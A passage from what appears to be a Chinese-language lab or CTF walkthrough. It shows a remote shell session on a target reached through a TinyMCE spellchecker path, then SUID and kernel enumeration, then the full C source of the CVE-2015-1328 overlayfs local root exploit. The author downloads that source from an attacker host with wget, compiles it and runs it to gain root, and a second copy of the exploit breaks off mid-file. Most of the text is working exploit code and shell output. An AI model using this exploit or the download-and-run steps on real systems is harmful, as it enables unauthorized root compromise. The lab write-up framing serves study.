class="string">[*] Command: echo 4XKzS89jZGiRslot;</span></span><br><span class="line"><span class="string">[*] Writing to socket A</span></span><br><span class="line"><span class="string">[*] Writing to socket B</span></span><br><span class="line"><span class="string">[*] Reading from sockets...</span></span><br><span class="line"><span class="string">[*] Reading from socket A</span></span><br><span class="line"><span class="string">[*] A: &quot;4XKzS89jZGiRslot\r\n&quot;</span></span><br><span class="line"><span class="string">[*] Matching...</span></span><br><span class="line"><span class="string">[*] B is input...</span></span><br><span class="line"><span class="string">[*] Command shell session 1 opened (192.168.3.11:4444 -&gt; 192.168.3.13:41072) at 2024-10-16 06:41:37 -0400</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">python3 -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ find / -perm -u=s -type f 2&gt;/dev/null</span></span><br><span class="line"><span class="string">&lt;.9/plugins/spellchecker$ find / -perm -u=s -type f 2&gt;/dev/null              </span></span><br><span class="line"><span class="string">/bin/umount</span></span><br><span class="line"><span class="string">/bin/ping6</span></span><br><span class="line"><span class="string">/bin/ping</span></span><br><span class="line"><span class="string">/bin/su</span></span><br><span class="line"><span class="string">/bin/mount</span></span><br><span class="line"><span class="string">/bin/fusermount</span></span><br><span class="line"><span class="string">/usr/bin/chfn</span></span><br><span class="line"><span class="string">/usr/bin/sudo</span></span><br><span class="line"><span class="string">/usr/bin/chsh</span></span><br><span class="line"><span class="string">/usr/bin/gpasswd</span></span><br><span class="line"><span class="string">/usr/bin/newgrp</span></span><br><span class="line"><span class="string">/usr/bin/mtr</span></span><br><span class="line"><span class="string">/usr/bin/passwd</span></span><br><span class="line"><span class="string">/usr/bin/traceroute6.iputils</span></span><br><span class="line"><span class="string">/usr/lib/openssh/ssh-keysign</span></span><br><span class="line"><span class="string">/usr/lib/eject/dmcrypt-get-device</span></span><br><span class="line"><span class="string">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></span><br><span class="line"><span class="string">/usr/lib/pt_chown</span></span><br><span class="line"><span class="string">/usr/sbin/pppd</span></span><br><span class="line"><span class="string">/usr/sbin/uuidd</span></span><br></pre></td></tr></table></figure>

<p>相关信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">&lt;.9/plugins/spellchecker$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null              </span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic <span class="comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.1 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>搜索得到对应cve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/37292</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span></span><br><span class="line"><span class="comment">CVE-2015-1328 / ofs.c</span></span><br><span class="line"><span class="comment">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">user@ubuntu-server-1504:~$ uname -a</span></span><br><span class="line"><span class="comment">Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span></span><br><span class="line"><span class="comment">user@ubuntu-server-1504:~$ id</span></span><br><span class="line"><span class="comment">uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)</span></span><br><span class="line"><span class="comment">user@ubuntu-server-1504:~$ ./ofs</span></span><br><span class="line"><span class="comment">spawning threads</span></span><br><span class="line"><span class="comment">mount #1</span></span><br><span class="line"><span class="comment">mount #2</span></span><br><span class="line"><span class="comment">child threads done</span></span><br><span class="line"><span class="comment">/etc/ld.so.preload created</span></span><br><span class="line"><span class="comment">creating shared library</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">greets to beist &amp; kaliman</span></span><br><span class="line"><span class="comment">2015-05-24</span></span><br><span class="line"><span class="comment">%rebel%</span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIB <span class="string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> child_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">child_exec</span><span class="params">(<span class="type">void</span> *stuff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>,<span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&#x27;t use /proc as lower</span></span><br><span class="line">        <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file = <span class="string">&quot;.access&quot;</span>;</span><br><span class="line">        chmod(<span class="string">&quot;/tmp/ns_sploit/work/work&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> file = <span class="string">&quot;ns_last_pid&quot;</span>;</span><br><span class="line"></span><br><span class="line">    chdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line">    rename(file,<span class="string">&quot;ld.so.preload&quot;</span>);</span><br><span class="line"></span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    umount(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;mount #2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        chmod(<span class="string">&quot;/tmp/ns_sploit/work/work&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chmod(<span class="string">&quot;/tmp/ns_sploit/o/ld.so.preload&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    umount(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> status, fd, lib;</span><br><span class="line">    <span class="type">pid_t</span> wrapper, init;</span><br><span class="line">    <span class="type">int</span> clone_flags = CLONE_NEWNS | SIGCHLD;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;spawning threads\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((wrapper = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create new user namespace\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((init = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">pid_t</span> pid =</span><br><span class="line">                clone(child_exec, child_stack + (<span class="number">1024</span>*<span class="number">1024</span>), clone_flags, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create new mount namespace\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        waitpid(init, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">300000</span>);</span><br><span class="line"></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;child threads done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/etc/ld.so.preload&quot;</span>,O_WRONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;exploit failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;/etc/ld.so.preload created\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;creating shared library\n&quot;</span>);</span><br><span class="line">    lib = open(<span class="string">&quot;/tmp/ofs-lib.c&quot;</span>,O_CREAT|O_WRONLY,<span class="number">0777</span>);</span><br><span class="line">    write(lib,LIB,<span class="built_in">strlen</span>(LIB));</span><br><span class="line">    close(lib);</span><br><span class="line">    lib = system(<span class="string">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(lib != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;couldn&#x27;t create dynamic library\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd,<span class="string">&quot;/tmp/ofs-lib.so\n&quot;</span>,<span class="number">16</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/su&quot;</span>,<span class="string">&quot;su&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>编译出错 最后调教g老师出了最终版</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ wget http://192.168.3.11:8083/37292.c</span><br><span class="line">&lt;.9/plugins/spellchecker$ wget http://192.168.3.11:8083/37292.c              </span><br><span class="line">--2024-10-16 05:33:46--  http://192.168.3.11:8083/37292.c</span><br><span class="line">Connecting to 192.168.3.11:8083... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 4083 (4.0K) [text/x-csrc]</span><br><span class="line">Saving to: <span class="string">&#x27;37292.c&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 4,083       --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-10-16 05:33:46 (634 MB/s) - <span class="string">&#x27;37292.c&#x27;</span> saved [4083/4083]</span><br><span class="line"></span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">37292.c        config.php        editor_plugin_src.js  includes</span><br><span class="line">changelog.txt  css               exp                   rpc.php</span><br><span class="line">classes        editor_plugin.js  img</span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cc -D_GNU_SOURCE -o exp 37292.c</span><br><span class="line">&lt;.9/plugins/spellchecker$ cc -D_GNU_SOURCE -o exp 37292.c                    </span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">37292.c        config.php        editor_plugin_src.js  includes</span><br><span class="line">changelog.txt  css               exp                   rpc.php</span><br><span class="line">classes        editor_plugin.js  img</span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">chmod</span> 777 exp </span><br><span class="line"><span class="built_in">chmod</span> 777 exp </span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 